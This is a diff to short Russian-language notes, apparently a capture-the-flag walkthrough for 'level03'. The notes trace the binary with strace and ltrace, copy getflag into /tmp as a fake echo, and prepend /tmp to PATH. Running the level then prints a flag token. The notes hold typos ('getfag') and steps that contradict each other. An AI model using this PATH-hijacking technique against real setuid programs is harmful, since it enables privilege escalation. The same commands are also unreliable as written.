@@ -14,6 +14,8 @@ strace ./level03
 https://www.networkworld.com/article/3658983/using-strace-and-ltrace-to-help-with-troubleshooting-on-linux.html
 ltrace ./level03
 
+which getflag
+/bin/getflag
 вызывается echo
 подменяем echo на getflag
 ищем каталог с правами на запись
@@ -21,10 +23,11 @@ ltrace ./level03
 ls -la /
 
 создаем жесткую ссылку в начала $PATH 
-ln -s /bin/getfag /tmp/bin/echo
+mkdir /tmp/bin
+cp /bin/getfag /tmp/echo
 
 добавляем каталог в начала
-PATH=/tmp:$PATH 
+PATH=/tmp:$PATH  или export echo=/tmp/echo
 
 ./level03
 token : qi0maab88jeaj46qoumi7maus
